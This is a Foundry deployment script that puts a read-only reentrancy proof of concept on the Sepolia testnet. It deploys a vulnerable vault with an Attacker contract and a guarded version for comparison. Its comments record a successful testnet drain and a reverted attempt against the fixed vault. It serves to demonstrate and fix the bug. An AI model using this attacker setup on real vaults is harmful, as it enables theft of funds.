// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Script, console2} from "forge-std/Script.sol";

// -- Proven on Sepolia (public Etherscan) via a Chainstack node -------------------------------
//   attacker (vuln)  0x5f306fd2522a4e8d73477647c833fe2e6c5486fe
//   attacker (fixed) 0x165b984de1c379cddea30e134a2a0c3c73f2f44a
//   1 DRAIN  https://sepolia.etherscan.io/tx/0x722d67befc01b86404b55864e21af66e9d7f91f3e5e35dd781b7f96b21e4b7e5  (Success, 0 -> 0.125 ETH, +0.025)
//   2 FIXED  https://sepolia.etherscan.io/tx/0xc9aa2dee058864db81b0bfd1760ad74b6fc8f919647351a0fbb536f06d5fc850  (Fail, execution reverted, guarded view)
// --------------------------------------------------------------------------------------------

import {IVault, Vault, VaultFixed, Seller, Attacker} from "../src/ROReentrancy.sol";

// Deploys the vulnerable + fixed setups to Sepolia at 0.1-ETH scale (the same 100->125 ratio as
// the local test). The two pwn() calls are fired separately with `cast send` so each is its own
// tx on Etherscan: the vulnerable one SUCCEEDS (drain), the fixed one REVERTS (guard trips).
contract DeploySepolia is Script {
    function run() external {
        uint256 pk = vm.envUint("PK");
        vm.startBroadcast(pk);
        // --- vulnerable setup ---
        Vault vault = new Vault();
        Seller seller = new Seller(IVault(address(vault)));
        vault.deposit{value: 0.1 ether}();                    // me: 0.1 ETH -> 0.1 shares, price 1.0
        vault.transferShares(address(seller), 0.05 ether);    // seller gets half the shares to sell
        Attacker attacker = new Attacker(IVault(address(vault)), seller);
        // --- fixed setup (identical, guarded vault) ---
        VaultFixed vaultF = new VaultFixed();
        Seller sellerF = new Seller(IVault(address(vaultF)));
        vaultF.deposit{value: 0.1 ether}();
        vaultF.transferShares(address(sellerF), 0.05 ether);
        Attacker attackerF = new Attacker(IVault(address(vaultF)), sellerF);
        vm.stopBroadcast();
        console2.log("VAULT", address(vault));
        console2.log("SELLER", address(seller));
        console2.log("ATTACKER", address(attacker));
        console2.log("VAULTFIXED", address(vaultF));
        console2.log("SELLERF", address(sellerF));
        console2.log("ATTACKERF", address(attackerF));
    }
}
